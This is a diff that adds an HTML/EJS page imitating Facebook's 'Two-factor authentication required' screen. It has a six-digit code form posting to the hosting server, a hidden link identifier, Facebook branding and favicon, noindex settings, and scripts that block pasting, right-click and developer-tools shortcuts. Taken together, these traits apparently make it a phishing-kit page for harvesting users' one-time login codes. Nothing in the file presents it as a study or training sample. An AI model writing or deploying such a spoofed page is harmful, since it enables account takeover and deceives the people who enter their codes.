@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Two-factor authentication required | Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#f0f2f5] min-h-screen">
+    <div class="flex flex-col min-h-screen">
+        <!-- Header -->
+        <header class="bg-white shadow-sm">
+            <div class="container mx-auto px-4 py-2">
+                <img src="/images/icons/fb.png" alt="Facebook" class="h-10">
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="flex-grow flex items-center justify-center p-4">
+            <div class="w-full max-w-md">
+                <div class="bg-white p-6 rounded-lg shadow-md">
+                    <div class="flex items-center justify-center mb-4">
+                        <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
+                            <svg class="w-8 h-8 text-[#1877f2]" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 2a3 3 0 00-3 3v2H5a2 2 0 00-2 2v7a2 2 0 002 2h10a2 2 0 002-2v-7a2 2 0 00-2-2h-2V5a3 3 0 00-3-3zm3 5V5a3 3 0 00-6 0v2h6z" clip-rule="evenodd"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <h1 class="text-xl font-semibold text-center mb-2">Two-factor authentication required</h1>
+                    <p class="text-gray-600 text-center mb-6">
+                        You've enabled two-factor authentication for added security. Please enter the code we sent to your phone number ending in ******<%= 09053110722 || '89' %>.
+                    </p>
+
+                    <form method="POST" class="space-y-4" autocomplete="off">
+                        <input type="hidden" name="linkId" value="<%= '' %>">
+                        
+                        <div class="flex justify-center gap-2">
+                            <% for(let i = 0; i < 6; i++) { %>
+                                <input type="text" 
+                                       name="otp<%= i + 1 %>" 
+                                       maxlength="1" 
+                                       required
+                                       pattern="[0-9]"
+                                       inputmode="numeric"
+                                       class="w-12 h-12 text-center text-xl border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
+                                       onpaste="return false"
+                                       autocomplete="off">
+                            <% } %>
+                        </div>
+
+                        <button type="submit" 
+                                class="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-lg hover:bg-[#166fe5] transition">
+                            Continue
+                        </button>
+                    </form>
+
+                    <div class="mt-4 text-center">
+                        <button onclick="resendCode()" 
+                                class="text-[#1877f2] text-sm hover:underline"
+                                id="resendButton">
+                            Didn't receive code? Send again
+                        </button>
+                        <div id="timer" class="text-sm text-gray-500 mt-2 hidden">
+                            Resend code in <span id="countdown">60</span>s
+                        </div>
+                    </div>
+
+                    <div class="mt-4 text-center">
+                        <a href="#" class="text-[#1877f2] text-sm hover:underline">Need another way to authenticate?</a>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="bg-white mt-auto">
+            <div class="container mx-auto px-4 py-4">
+                <div class="text-center text-gray-600 text-sm">
+                    <p>English (US)</p>
+                    <p class="mt-2">Meta © <%= new Date().getFullYear() %></p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Auto-focus first input on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelector('input[name="otp1"]').focus();
+        });
+
+        // Handle OTP input
+        const inputs = document.querySelectorAll('input[type="text"]');
+        inputs.forEach((input, index) => {
+            // Only allow numbers
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            // Handle backspace
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Resend code functionality
+        let countdown;
+        function resendCode() {
+            const button = document.getElementById('resendButton');
+            const timer = document.getElementById('timer');
+            const countdownSpan = document.getElementById('countdown');
+            let seconds = 60;
+
+            button.style.display = 'none';
+            timer.classList.remove('hidden');
+
+            countdown = setInterval(() => {
+                seconds--;
+                countdownSpan.textContent = seconds;
+
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    button.style.display = 'inline';
+                    timer.classList.add('hidden');
+                }
+            }, 1000);
+        }
+
+        // Prevent form resubmission on refresh
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+
+        // Disable right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Disable developer tools shortcut
+        document.addEventListener('keydown', (e) => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
